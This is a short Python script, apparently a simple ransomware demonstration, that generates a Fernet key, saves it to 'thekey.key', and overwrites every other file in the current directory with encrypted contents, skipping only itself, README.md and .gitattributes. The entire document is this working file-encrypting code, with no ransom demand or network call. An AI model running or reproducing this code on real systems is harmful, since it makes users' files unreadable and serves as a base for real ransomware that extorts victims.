import os
from cryptography.fernet import Fernet
#a
files = []

#print(os.listdir())

for file in os.listdir():
    if file == 'valdemort.py' or file == '.gitattributes' or file == 'README.md':
        continue
    if file != "thekey.key":
        if os.path.isfile(file):
            files.append(file)

key = Fernet.generate_key()
print(key)

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
